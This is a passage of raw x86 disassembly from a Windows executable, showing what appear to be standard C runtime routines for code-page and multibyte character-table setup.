  4077f2:	e8 1b f4 ff ff       	call   0x406c12
  4077f7:	59                   	pop    %ecx
  4077f8:	c3                   	ret
  4077f9:	8b ff                	mov    %edi,%edi
  4077fb:	55                   	push   %ebp
  4077fc:	8b ec                	mov    %esp,%ebp
  4077fe:	8b 45 08             	mov    0x8(%ebp),%eax
  407801:	8b c8                	mov    %eax,%ecx
  407803:	83 e0 1f             	and    $0x1f,%eax
  407806:	c1 f9 05             	sar    $0x5,%ecx
  407809:	8b 0c 8d 20 16 41 00 	mov    0x411620(,%ecx,4),%ecx
  407810:	c1 e0 06             	shl    $0x6,%eax
  407813:	8d 44 01 0c          	lea    0xc(%ecx,%eax,1),%eax
  407817:	50                   	push   %eax
  407818:	ff 15 88 b0 40 00    	call   *0x40b088
  40781e:	5d                   	pop    %ebp
  40781f:	c3                   	ret
  407820:	6a 10                	push   $0x10
  407822:	68 00 da 40 00       	push   $0x40da00
  407827:	e8 a4 d2 ff ff       	call   0x404ad0
  40782c:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40782f:	83 fb fe             	cmp    $0xfffffffe,%ebx
  407832:	75 13                	jne    0x407847
  407834:	e8 74 ca ff ff       	call   0x4042ad
  407839:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40783f:	83 c8 ff             	or     $0xffffffff,%eax
  407842:	e9 a1 00 00 00       	jmp    0x4078e8
  407847:	85 db                	test   %ebx,%ebx
  407849:	78 08                	js     0x407853
  40784b:	3b 1d 04 16 41 00    	cmp    0x411604,%ebx
  407851:	72 12                	jb     0x407865
  407853:	e8 55 ca ff ff       	call   0x4042ad
  407858:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40785e:	e8 f8 c9 ff ff       	call   0x40425b
  407863:	eb da                	jmp    0x40783f
  407865:	8b c3                	mov    %ebx,%eax
  407867:	c1 f8 05             	sar    $0x5,%eax
  40786a:	8d 3c 85 20 16 41 00 	lea    0x411620(,%eax,4),%edi
  407871:	8b f3                	mov    %ebx,%esi
  407873:	83 e6 1f             	and    $0x1f,%esi
  407876:	c1 e6 06             	shl    $0x6,%esi
  407879:	8b 07                	mov    (%edi),%eax
  40787b:	0f be 44 06 04       	movsbl 0x4(%esi,%eax,1),%eax
  407880:	83 e0 01             	and    $0x1,%eax
  407883:	74 ce                	je     0x407853
  407885:	53                   	push   %ebx
  407886:	e8 cf fe ff ff       	call   0x40775a
  40788b:	59                   	pop    %ecx
  40788c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407890:	8b 07                	mov    (%edi),%eax
  407892:	f6 44 06 04 01       	testb  $0x1,0x4(%esi,%eax,1)
  407897:	74 31                	je     0x4078ca
  407899:	53                   	push   %ebx
  40789a:	e8 52 fe ff ff       	call   0x4076f1
  40789f:	59                   	pop    %ecx
  4078a0:	50                   	push   %eax
  4078a1:	ff 15 74 b1 40 00    	call   *0x40b174
  4078a7:	85 c0                	test   %eax,%eax
  4078a9:	75 0b                	jne    0x4078b6
  4078ab:	ff 15 8c b0 40 00    	call   *0x40b08c
  4078b1:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4078b4:	eb 04                	jmp    0x4078ba
  4078b6:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  4078ba:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4078be:	74 19                	je     0x4078d9
  4078c0:	e8 fb c9 ff ff       	call   0x4042c0
  4078c5:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4078c8:	89 08                	mov    %ecx,(%eax)
  4078ca:	e8 de c9 ff ff       	call   0x4042ad
  4078cf:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4078d5:	83 4d e4 ff          	orl    $0xffffffff,-0x1c(%ebp)
  4078d9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4078e0:	e8 0c 00 00 00       	call   0x4078f1
  4078e5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4078e8:	e8 28 d2 ff ff       	call   0x404b15
  4078ed:	c3                   	ret
  4078ee:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4078f1:	53                   	push   %ebx
  4078f2:	e8 02 ff ff ff       	call   0x4077f9
  4078f7:	59                   	pop    %ecx
  4078f8:	c3                   	ret
  4078f9:	2d a4 03 00 00       	sub    $0x3a4,%eax
  4078fe:	74 22                	je     0x407922
  407900:	83 e8 04             	sub    $0x4,%eax
  407903:	74 17                	je     0x40791c
  407905:	83 e8 0d             	sub    $0xd,%eax
  407908:	74 0c                	je     0x407916
  40790a:	48                   	dec    %eax
  40790b:	74 03                	je     0x407910
  40790d:	33 c0                	xor    %eax,%eax
  40790f:	c3                   	ret
  407910:	b8 04 04 00 00       	mov    $0x404,%eax
  407915:	c3                   	ret
  407916:	b8 12 04 00 00       	mov    $0x412,%eax
  40791b:	c3                   	ret
  40791c:	b8 04 08 00 00       	mov    $0x804,%eax
  407921:	c3                   	ret
  407922:	b8 11 04 00 00       	mov    $0x411,%eax
  407927:	c3                   	ret
  407928:	8b ff                	mov    %edi,%edi
  40792a:	56                   	push   %esi
  40792b:	57                   	push   %edi
  40792c:	8b f0                	mov    %eax,%esi
  40792e:	68 01 01 00 00       	push   $0x101
  407933:	33 ff                	xor    %edi,%edi
  407935:	8d 46 1c             	lea    0x1c(%esi),%eax
  407938:	57                   	push   %edi
  407939:	50                   	push   %eax
  40793a:	e8 b1 c2 ff ff       	call   0x403bf0
  40793f:	33 c0                	xor    %eax,%eax
  407941:	0f b7 c8             	movzwl %ax,%ecx
  407944:	8b c1                	mov    %ecx,%eax
  407946:	89 7e 04             	mov    %edi,0x4(%esi)
  407949:	89 7e 08             	mov    %edi,0x8(%esi)
  40794c:	89 7e 0c             	mov    %edi,0xc(%esi)
  40794f:	c1 e1 10             	shl    $0x10,%ecx
  407952:	0b c1                	or     %ecx,%eax
  407954:	8d 7e 10             	lea    0x10(%esi),%edi
  407957:	ab                   	stos   %eax,%es:(%edi)
  407958:	ab                   	stos   %eax,%es:(%edi)
  407959:	ab                   	stos   %eax,%es:(%edi)
  40795a:	b9 70 f6 40 00       	mov    $0x40f670,%ecx
  40795f:	83 c4 0c             	add    $0xc,%esp
  407962:	8d 46 1c             	lea    0x1c(%esi),%eax
  407965:	2b ce                	sub    %esi,%ecx
  407967:	bf 01 01 00 00       	mov    $0x101,%edi
  40796c:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  40796f:	88 10                	mov    %dl,(%eax)
  407971:	40                   	inc    %eax
  407972:	4f                   	dec    %edi
  407973:	75 f7                	jne    0x40796c
  407975:	8d 86 1d 01 00 00    	lea    0x11d(%esi),%eax
  40797b:	be 00 01 00 00       	mov    $0x100,%esi
  407980:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  407983:	88 10                	mov    %dl,(%eax)
  407985:	40                   	inc    %eax
  407986:	4e                   	dec    %esi
  407987:	75 f7                	jne    0x407980
  407989:	5f                   	pop    %edi
  40798a:	5e                   	pop    %esi
  40798b:	c3                   	ret
  40798c:	8b ff                	mov    %edi,%edi
  40798e:	55                   	push   %ebp
  40798f:	8b ec                	mov    %esp,%ebp
  407991:	81 ec 1c 05 00 00    	sub    $0x51c,%esp
  407997:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  40799c:	33 c5                	xor    %ebp,%eax
  40799e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4079a1:	53                   	push   %ebx
  4079a2:	57                   	push   %edi
  4079a3:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
  4079a9:	50                   	push   %eax
  4079aa:	ff 76 04             	push   0x4(%esi)
  4079ad:	ff 15 78 b1 40 00    	call   *0x40b178
  4079b3:	bf 00 01 00 00       	mov    $0x100,%edi
  4079b8:	85 c0                	test   %eax,%eax
  4079ba:	0f 84 fc 00 00 00    	je     0x407abc
  4079c0:	33 c0                	xor    %eax,%eax
  4079c2:	88 84 05 fc fe ff ff 	mov    %al,-0x104(%ebp,%eax,1)
  4079c9:	40                   	inc    %eax
  4079ca:	3b c7                	cmp    %edi,%eax
  4079cc:	72 f4                	jb     0x4079c2
  4079ce:	8a 85 ee fa ff ff    	mov    -0x512(%ebp),%al
  4079d4:	c6 85 fc fe ff ff 20 	movb   $0x20,-0x104(%ebp)
  4079db:	84 c0                	test   %al,%al
  4079dd:	74 30                	je     0x407a0f
  4079df:	8d 9d ef fa ff ff    	lea    -0x511(%ebp),%ebx
  4079e5:	0f b6 c8             	movzbl %al,%ecx
  4079e8:	0f b6 03             	movzbl (%ebx),%eax
  4079eb:	3b c8                	cmp    %eax,%ecx
  4079ed:	77 16                	ja     0x407a05
  4079ef:	2b c1                	sub    %ecx,%eax
  4079f1:	40                   	inc    %eax
  4079f2:	50                   	push   %eax
  4079f3:	8d 94 0d fc fe ff ff 	lea    -0x104(%ebp,%ecx,1),%edx
  4079fa:	6a 20                	push   $0x20
  4079fc:	52                   	push   %edx
  4079fd:	e8 ee c1 ff ff       	call   0x403bf0
  407a02:	83 c4 0c             	add    $0xc,%esp
  407a05:	8a 43 01             	mov    0x1(%ebx),%al
  407a08:	83 c3 02             	add    $0x2,%ebx
  407a0b:	84 c0                	test   %al,%al
  407a0d:	75 d6                	jne    0x4079e5
  407a0f:	6a 00                	push   $0x0
  407a11:	ff 76 0c             	push   0xc(%esi)
  407a14:	8d 85 fc fa ff ff    	lea    -0x504(%ebp),%eax
  407a1a:	ff 76 04             	push   0x4(%esi)
  407a1d:	50                   	push   %eax
  407a1e:	57                   	push   %edi
  407a1f:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  407a25:	50                   	push   %eax
  407a26:	6a 01                	push   $0x1
  407a28:	6a 00                	push   $0x0
  407a2a:	e8 97 10 00 00       	call   0x408ac6
  407a2f:	33 db                	xor    %ebx,%ebx
  407a31:	53                   	push   %ebx
  407a32:	ff 76 04             	push   0x4(%esi)
  407a35:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  407a3b:	57                   	push   %edi
  407a3c:	50                   	push   %eax
  407a3d:	57                   	push   %edi
  407a3e:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  407a44:	50                   	push   %eax
  407a45:	57                   	push   %edi
  407a46:	ff 76 0c             	push   0xc(%esi)
  407a49:	53                   	push   %ebx
  407a4a:	e8 4a 0f 00 00       	call   0x408999
  407a4f:	83 c4 44             	add    $0x44,%esp
  407a52:	53                   	push   %ebx
  407a53:	ff 76 04             	push   0x4(%esi)
  407a56:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  407a5c:	57                   	push   %edi
  407a5d:	50                   	push   %eax
  407a5e:	57                   	push   %edi
  407a5f:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  407a65:	50                   	push   %eax
  407a66:	68 00 02 00 00       	push   $0x200
  407a6b:	ff 76 0c             	push   0xc(%esi)
  407a6e:	53                   	push   %ebx
  407a6f:	e8 25 0f 00 00       	call   0x408999
  407a74:	83 c4 24             	add    $0x24,%esp
  407a77:	33 c0                	xor    %eax,%eax
  407a79:	0f b7 8c 45 fc fa ff 	movzwl -0x504(%ebp,%eax,2),%ecx
  407a80:	ff 
  407a81:	f6 c1 01             	test   $0x1,%cl
  407a84:	74 0e                	je     0x407a94
  407a86:	80 4c 06 1d 10       	orb    $0x10,0x1d(%esi,%eax,1)
  407a8b:	8a 8c 05 fc fd ff ff 	mov    -0x204(%ebp,%eax,1),%cl
  407a92:	eb 11                	jmp    0x407aa5
  407a94:	f6 c1 02             	test   $0x2,%cl
  407a97:	74 15                	je     0x407aae
  407a99:	80 4c 06 1d 20       	orb    $0x20,0x1d(%esi,%eax,1)
  407a9e:	8a 8c 05 fc fc ff ff 	mov    -0x304(%ebp,%eax,1),%cl
  407aa5:	88 8c 06 1d 01 00 00 	mov    %cl,0x11d(%esi,%eax,1)
  407aac:	eb 07                	jmp    0x407ab5
  407aae:	88 9c 06 1d 01 00 00 	mov    %bl,0x11d(%esi,%eax,1)
  407ab5:	40                   	inc    %eax
  407ab6:	3b c7                	cmp    %edi,%eax
  407ab8:	72 bf                	jb     0x407a79
  407aba:	eb 52                	jmp    0x407b0e
  407abc:	8d 86 1d 01 00 00    	lea    0x11d(%esi),%eax
  407ac2:	c7 85 e4 fa ff ff 9f 	movl   $0xffffff9f,-0x51c(%ebp)
  407ac9:	ff ff ff 
  407acc:	33 c9                	xor    %ecx,%ecx
  407ace:	29 85 e4 fa ff ff    	sub    %eax,-0x51c(%ebp)
  407ad4:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  407ada:	8d 84 0e 1d 01 00 00 	lea    0x11d(%esi,%ecx,1),%eax
  407ae1:	03 d0                	add    %eax,%edx
  407ae3:	8d 5a 20             	lea    0x20(%edx),%ebx
  407ae6:	83 fb 19             	cmp    $0x19,%ebx
  407ae9:	77 0a                	ja     0x407af5
  407aeb:	80 4c 0e 1d 10       	orb    $0x10,0x1d(%esi,%ecx,1)
  407af0:	8d 51 20             	lea    0x20(%ecx),%edx
  407af3:	eb 0d                	jmp    0x407b02
  407af5:	83 fa 19             	cmp    $0x19,%edx
  407af8:	77 0c                	ja     0x407b06
  407afa:	80 4c 0e 1d 20       	orb    $0x20,0x1d(%esi,%ecx,1)
  407aff:	8d 51 e0             	lea    -0x20(%ecx),%edx
  407b02:	88 10                	mov    %dl,(%eax)
  407b04:	eb 03                	jmp    0x407b09
  407b06:	c6 00 00             	movb   $0x0,(%eax)
  407b09:	41                   	inc    %ecx
  407b0a:	3b cf                	cmp    %edi,%ecx
  407b0c:	72 c6                	jb     0x407ad4
  407b0e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407b11:	5f                   	pop    %edi
  407b12:	33 cd                	xor    %ebp,%ecx
  407b14:	5b                   	pop    %ebx
  407b15:	e8 64 b5 ff ff       	call   0x40307e
  407b1a:	c9                   	leave
  407b1b:	c3                   	ret
  407b1c:	6a 0c                	push   $0xc
  407b1e:	68 20 da 40 00       	push   $0x40da20
  407b23:	e8 a8 cf ff ff       	call   0x404ad0
  407b28:	e8 58 eb ff ff       	call   0x406685
  407b2d:	8b f8                	mov    %eax,%edi
  407b2f:	a1 90 fb 40 00       	mov    0x40fb90,%eax
  407b34:	85 47 70             	test   %eax,0x70(%edi)
  407b37:	74 1d                	je     0x407b56
  407b39:	83 7f 6c 00          	cmpl   $0x0,0x6c(%edi)
  407b3d:	74 17                	je     0x407b56
  407b3f:	8b 77 68             	mov    0x68(%edi),%esi
  407b42:	85 f6                	test   %esi,%esi
  407b44:	75 08                	jne    0x407b4e
  407b46:	6a 20                	push   $0x20
  407b48:	e8 57 cf ff ff       	call   0x404aa4
  407b4d:	59                   	pop    %ecx
  407b4e:	8b c6                	mov    %esi,%eax
  407b50:	e8 c0 cf ff ff       	call   0x404b15
  407b55:	c3                   	ret
  407b56:	6a 0d                	push   $0xd
  407b58:	e8 8e f1 ff ff       	call   0x406ceb
  407b5d:	59                   	pop    %ecx
  407b5e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407b62:	8b 77 68             	mov    0x68(%edi),%esi
  407b65:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  407b68:	3b 35 98 fa 40 00    	cmp    0x40fa98,%esi
  407b6e:	74 36                	je     0x407ba6
  407b70:	85 f6                	test   %esi,%esi
  407b72:	74 1a                	je     0x407b8e
  407b74:	56                   	push   %esi
  407b75:	ff 15 50 b1 40 00    	call   *0x40b150
  407b7b:	85 c0                	test   %eax,%eax
  407b7d:	75 0f                	jne    0x407b8e
  407b7f:	81 fe 70 f6 40 00    	cmp    $0x40f670,%esi
  407b85:	74 07                	je     0x407b8e
  407b87:	56                   	push   %esi
  407b88:	e8 1e c0 ff ff       	call   0x403bab
  407b8d:	59                   	pop    %ecx
  407b8e:	a1 98 fa 40 00       	mov    0x40fa98,%eax
  407b93:	89 47 68             	mov    %eax,0x68(%edi)
  407b96:	8b 35 98 fa 40 00    	mov    0x40fa98,%esi
  407b9c:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  407b9f:	56                   	push   %esi
  407ba0:	ff 15 44 b1 40 00    	call   *0x40b144
  407ba6:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407bad:	e8 05 00 00 00       	call   0x407bb7
  407bb2:	eb 8e                	jmp    0x407b42
  407bb4:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  407bb7:	6a 0d                	push   $0xd
  407bb9:	e8 54 f0 ff ff       	call   0x406c12
  407bbe:	59                   	pop    %ecx
  407bbf:	c3                   	ret
  407bc0:	8b ff                	mov    %edi,%edi
  407bc2:	55                   	push   %ebp
  407bc3:	8b ec                	mov    %esp,%ebp
  407bc5:	83 ec 10             	sub    $0x10,%esp
  407bc8:	53                   	push   %ebx
  407bc9:	33 db                	xor    %ebx,%ebx
  407bcb:	53                   	push   %ebx
  407bcc:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407bcf:	e8 09 df ff ff       	call   0x405add
  407bd4:	89 1d ac 15 41 00    	mov    %ebx,0x4115ac
  407bda:	83 fe fe             	cmp    $0xfffffffe,%esi
  407bdd:	75 1e                	jne    0x407bfd
  407bdf:	c7 05 ac 15 41 00 01 	movl   $0x1,0x4115ac
  407be6:	00 00 00 
  407be9:	ff 15 80 b1 40 00    	call   *0x40b180
  407bef:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  407bf2:	74 45                	je     0x407c39
  407bf4:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407bf7:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  407bfb:	eb 3c                	jmp    0x407c39
  407bfd:	83 fe fd             	cmp    $0xfffffffd,%esi
  407c00:	75 12                	jne    0x407c14
  407c02:	c7 05 ac 15 41 00 01 	movl   $0x1,0x4115ac
  407c09:	00 00 00 
  407c0c:	ff 15 7c b1 40 00    	call   *0x40b17c
  407c12:	eb db                	jmp    0x407bef
  407c14:	83 fe fc             	cmp    $0xfffffffc,%esi
  407c17:	75 12                	jne    0x407c2b
  407c19:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407c1c:	8b 40 04             	mov    0x4(%eax),%eax
  407c1f:	c7 05 ac 15 41 00 01 	movl   $0x1,0x4115ac
  407c26:	00 00 00 
  407c29:	eb c4                	jmp    0x407bef
  407c2b:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  407c2e:	74 07                	je     0x407c37
  407c30:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407c33:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  407c37:	8b c6                	mov    %esi,%eax
  407c39:	5b                   	pop    %ebx
  407c3a:	c9                   	leave
  407c3b:	c3                   	ret
  407c3c:	8b ff                	mov    %edi,%edi
  407c3e:	55                   	push   %ebp
  407c3f:	8b ec                	mov    %esp,%ebp
  407c41:	83 ec 20             	sub    $0x20,%esp
  407c44:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  407c49:	33 c5                	xor    %ebp,%eax
  407c4b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407c4e:	53                   	push   %ebx
  407c4f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  407c52:	56                   	push   %esi
  407c53:	8b 75 08             	mov    0x8(%ebp),%esi
  407c56:	57                   	push   %edi
  407c57:	e8 64 ff ff ff       	call   0x407bc0
  407c5c:	8b f8                	mov    %eax,%edi
  407c5e:	33 f6                	xor    %esi,%esi
  407c60:	89 7d 08             	mov    %edi,0x8(%ebp)
  407c63:	3b fe                	cmp    %esi,%edi
  407c65:	75 0e                	jne    0x407c75
  407c67:	8b c3                	mov    %ebx,%eax
  407c69:	e8 ba fc ff ff       	call   0x407928
  407c6e:	33 c0                	xor    %eax,%eax
  407c70:	e9 a1 01 00 00       	jmp    0x407e16
  407c75:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  407c78:	33 c0                	xor    %eax,%eax
  407c7a:	39 b8 a0 fa 40 00    	cmp    %edi,0x40faa0(%eax)
  407c80:	0f 84 91 00 00 00    	je     0x407d17
  407c86:	ff 45 e4             	incl   -0x1c(%ebp)
  407c89:	83 c0 30             	add    $0x30,%eax
  407c8c:	3d f0 00 00 00       	cmp    $0xf0,%eax
  407c91:	72 e7                	jb     0x407c7a
  407c93:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
  407c99:	0f 84 74 01 00 00    	je     0x407e13
  407c9f:	81 ff e9 fd 00 00    	cmp    $0xfde9,%edi
  407ca5:	0f 84 68 01 00 00    	je     0x407e13
  407cab:	0f b7 c7             	movzwl %di,%eax
  407cae:	50                   	push   %eax
  407caf:	ff 15 84 b1 40 00    	call   *0x40b184
  407cb5:	85 c0                	test   %eax,%eax
  407cb7:	0f 84 56 01 00 00    	je     0x407e13
  407cbd:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407cc0:	50                   	push   %eax
  407cc1:	57                   	push   %edi
  407cc2:	ff 15 78 b1 40 00    	call   *0x40b178
  407cc8:	85 c0                	test   %eax,%eax
  407cca:	0f 84 37 01 00 00    	je     0x407e07
  407cd0:	68 01 01 00 00       	push   $0x101
  407cd5:	8d 43 1c             	lea    0x1c(%ebx),%eax
  407cd8:	56                   	push   %esi
  407cd9:	50                   	push   %eax
  407cda:	e8 11 bf ff ff       	call   0x403bf0
  407cdf:	33 d2                	xor    %edx,%edx
  407ce1:	42                   	inc    %edx
  407ce2:	83 c4 0c             	add    $0xc,%esp
  407ce5:	89 7b 04             	mov    %edi,0x4(%ebx)
  407ce8:	89 73 0c             	mov    %esi,0xc(%ebx)
  407ceb:	39 55 e8             	cmp    %edx,-0x18(%ebp)
  407cee:	0f 86 fc 00 00 00    	jbe    0x407df0
  407cf4:	80 7d ee 00          	cmpb   $0x0,-0x12(%ebp)
  407cf8:	0f 84 d3 00 00 00    	je     0x407dd1
  407cfe:	8d 75 ef             	lea    -0x11(%ebp),%esi
  407d01:	8a 0e                	mov    (%esi),%cl
  407d03:	84 c9                	test   %cl,%cl
  407d05:	0f 84 c6 00 00 00    	je     0x407dd1
  407d0b:	0f b6 46 ff          	movzbl -0x1(%esi),%eax
  407d0f:	0f b6 c9             	movzbl %cl,%ecx
  407d12:	e9 a9 00 00 00       	jmp    0x407dc0
  407d17:	68 01 01 00 00       	push   $0x101
  407d1c:	8d 43 1c             	lea    0x1c(%ebx),%eax
  407d1f:	56                   	push   %esi
  407d20:	50                   	push   %eax
  407d21:	e8 ca be ff ff       	call   0x403bf0
  407d26:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  407d29:	83 c4 0c             	add    $0xc,%esp
  407d2c:	6b c9 30             	imul   $0x30,%ecx,%ecx
  407d2f:	89 75 e0             	mov    %esi,-0x20(%ebp)
  407d32:	8d b1 b0 fa 40 00    	lea    0x40fab0(%ecx),%esi
  407d38:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  407d3b:	eb 2b                	jmp    0x407d68
  407d3d:	8a 46 01             	mov    0x1(%esi),%al
  407d40:	84 c0                	test   %al,%al
  407d42:	74 29                	je     0x407d6d
  407d44:	0f b6 3e             	movzbl (%esi),%edi
  407d47:	0f b6 c0             	movzbl %al,%eax
  407d4a:	eb 12                	jmp    0x407d5e
  407d4c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  407d4f:	8a 80 9c fa 40 00    	mov    0x40fa9c(%eax),%al
  407d55:	08 44 3b 1d          	or     %al,0x1d(%ebx,%edi,1)
  407d59:	0f b6 46 01          	movzbl 0x1(%esi),%eax
  407d5d:	47                   	inc    %edi
  407d5e:	3b f8                	cmp    %eax,%edi
  407d60:	76 ea                	jbe    0x407d4c
  407d62:	8b 7d 08             	mov    0x8(%ebp),%edi
  407d65:	83 c6 02             	add    $0x2,%esi
  407d68:	80 3e 00             	cmpb   $0x0,(%esi)
  407d6b:	75 d0                	jne    0x407d3d
  407d6d:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  407d70:	ff 45 e0             	incl   -0x20(%ebp)
  407d73:	83 c6 08             	add    $0x8,%esi
  407d76:	83 7d e0 04          	cmpl   $0x4,-0x20(%ebp)
  407d7a:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  407d7d:	72 e9                	jb     0x407d68
  407d7f:	8b c7                	mov    %edi,%eax
  407d81:	89 7b 04             	mov    %edi,0x4(%ebx)
  407d84:	c7 43 08 01 00 00 00 	movl   $0x1,0x8(%ebx)
  407d8b:	e8 69 fb ff ff       	call   0x4078f9
  407d90:	6a 06                	push   $0x6
  407d92:	89 43 0c             	mov    %eax,0xc(%ebx)
  407d95:	8d 43 10             	lea    0x10(%ebx),%eax
  407d98:	8d 89 a4 fa 40 00    	lea    0x40faa4(%ecx),%ecx
  407d9e:	5a                   	pop    %edx
  407d9f:	66 8b 31             	mov    (%ecx),%si
  407da2:	66 89 30             	mov    %si,(%eax)
  407da5:	83 c1 02             	add    $0x2,%ecx
  407da8:	83 c0 02             	add    $0x2,%eax
  407dab:	4a                   	dec    %edx
  407dac:	75 f1                	jne    0x407d9f
  407dae:	8b f3                	mov    %ebx,%esi
  407db0:	e8 d7 fb ff ff       	call   0x40798c
  407db5:	e9 b4 fe ff ff       	jmp    0x407c6e
  407dba:	80 4c 03 1d 04       	orb    $0x4,0x1d(%ebx,%eax,1)
  407dbf:	40                   	inc    %eax
  407dc0:	3b c1                	cmp    %ecx,%eax
  407dc2:	76 f6                	jbe    0x407dba
  407dc4:	83 c6 02             	add    $0x2,%esi
  407dc7:	80 7e ff 00          	cmpb   $0x0,-0x1(%esi)
  407dcb:	0f 85 30 ff ff ff    	jne    0x407d01
  407dd1:	8d 43 1e             	lea    0x1e(%ebx),%eax
  407dd4:	b9 fe 00 00 00       	mov    $0xfe,%ecx
  407dd9:	80 08 08             	orb    $0x8,(%eax)
  407ddc:	40                   	inc    %eax
  407ddd:	49                   	dec    %ecx
  407dde:	75 f9                	jne    0x407dd9
  407de0:	8b 43 04             	mov    0x4(%ebx),%eax
  407de3:	e8 11 fb ff ff       	call   0x4078f9
  407de8:	89 43 0c             	mov    %eax,0xc(%ebx)
  407deb:	89 53 08             	mov    %edx,0x8(%ebx)
  407dee:	eb 03                	jmp    0x407df3
  407df0:	89 73 08             	mov    %esi,0x8(%ebx)
  407df3:	33 c0                	xor    %eax,%eax
  407df5:	0f b7 c8             	movzwl %ax,%ecx
  407df8:	8b c1                	mov    %ecx,%eax
  407dfa:	c1 e1 10             	shl    $0x10,%ecx
  407dfd:	0b c1                	or     %ecx,%eax
  407dff:	8d 7b 10             	lea    0x10(%ebx),%edi
  407e02:	ab                   	stos   %eax,%es:(%edi)
  407e03:	ab                   	stos   %eax,%es:(%edi)
  407e04:	ab                   	stos   %eax,%es:(%edi)
  407e05:	eb a7                	jmp    0x407dae
  407e07:	39 35 ac 15 41 00    	cmp    %esi,0x4115ac
  407e0d:	0f 85 54 fe ff ff    	jne    0x407c67
  407e13:	83 c8 ff             	or     $0xffffffff,%eax
  407e16:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407e19:	5f                   	pop    %edi
  407e1a:	5e                   	pop    %esi
  407e1b:	33 cd                	xor    %ebp,%ecx
  407e1d:	5b                   	pop    %ebx
  407e1e:	e8 5b b2 ff ff       	call   0x40307e
  407e23:	c9                   	leave
  407e24:	c3                   	ret
  407e25:	6a 14                	push   $0x14
  407e27:	68 40 da 40 00       	push   $0x40da40
  407e2c:	e8 9f cc ff ff       	call   0x404ad0
  407e31:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  407e35:	e8 4b e8 ff ff       	call   0x406685
  407e3a:	8b f8                	mov    %eax,%edi
  407e3c:	89 7d dc             	mov    %edi,-0x24(%ebp)
  407e3f:	e8 d8 fc ff ff       	call   0x407b1c
  407e44:	8b 5f 68             	mov    0x68(%edi),%ebx
  407e47:	8b 75 08             	mov    0x8(%ebp),%esi
  407e4a:	e8 71 fd ff ff       	call   0x407bc0
  407e4f:	89 45 08             	mov    %eax,0x8(%ebp)
  407e52:	3b 43 04             	cmp    0x4(%ebx),%eax
  407e55:	0f 84 57 01 00 00    	je     0x407fb2
  407e5b:	68 20 02 00 00       	push   $0x220
  407e60:	e8 60 c8 ff ff       	call   0x4046c5
  407e65:	59                   	pop    %ecx
  407e66:	8b d8                	mov    %eax,%ebx
  407e68:	85 db                	test   %ebx,%ebx
  407e6a:	0f 84 46 01 00 00    	je     0x407fb6
  407e70:	b9 88 00 00 00       	mov    $0x88,%ecx
  407e75:	8b 77 68             	mov    0x68(%edi),%esi
  407e78:	8b fb                	mov    %ebx,%edi
  407e7a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407e7c:	83 23 00             	andl   $0x0,(%ebx)
  407e7f:	53                   	push   %ebx
  407e80:	ff 75 08             	push   0x8(%ebp)
  407e83:	e8 b4 fd ff ff       	call   0x407c3c
  407e88:	59                   	pop    %ecx
  407e89:	59                   	pop    %ecx
  407e8a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  407e8d:	85 c0                	test   %eax,%eax
  407e8f:	0f 85 fc 00 00 00    	jne    0x407f91
  407e95:	8b 75 dc             	mov    -0x24(%ebp),%esi
  407e98:	ff 76 68             	push   0x68(%esi)
  407e9b:	ff 15 50 b1 40 00    	call   *0x40b150
  407ea1:	85 c0                	test   %eax,%eax
  407ea3:	75 11                	jne    0x407eb6
  407ea5:	8b 46 68             	mov    0x68(%esi),%eax
  407ea8:	3d 70 f6 40 00       	cmp    $0x40f670,%eax
  407ead:	74 07                	je     0x407eb6
  407eaf:	50                   	push   %eax
  407eb0:	e8 f6 bc ff ff       	call   0x403bab
  407eb5:	59                   	pop    %ecx
  407eb6:	89 5e 68             	mov    %ebx,0x68(%esi)
  407eb9:	53                   	push   %ebx
